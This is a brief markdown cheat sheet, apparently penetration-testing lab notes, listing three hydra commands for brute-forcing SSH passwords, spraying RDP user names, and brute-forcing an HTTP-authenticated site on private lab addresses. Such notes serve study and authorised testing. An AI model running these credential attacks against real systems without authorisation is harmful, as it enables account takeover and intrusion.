## brute force against ssh (passwords)
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

## brute force against rdp (user names)
```
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 ```
 
 ## brute force on password protected site
 ```
 hydra -l user -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.241.201 http-get /
```